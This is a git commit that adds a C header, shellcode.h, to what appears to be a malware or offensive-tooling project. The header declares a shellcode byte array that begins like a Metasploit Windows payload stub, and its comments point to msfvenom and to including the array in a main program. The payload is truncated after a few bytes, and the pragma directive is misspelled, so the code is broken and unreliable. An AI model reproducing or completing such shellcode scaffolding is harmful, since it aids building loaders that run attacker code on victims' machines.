2d55616688705aced188a829dcd167ac404f38ba
BroccoliSnivy <businesschavan2004@gmail.com>
2025-06-30 14:48:28 +0530

    Create shellcode.h

---
+++ shellcode.h
@@ -0,0 +1,6 @@
+#paragm once 
+
+// You can generate your own using msfvenom 
+// Can be easily used in main program by using #include "shellcode.h"
+
+unsigned char shellcode[] = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"; // ...
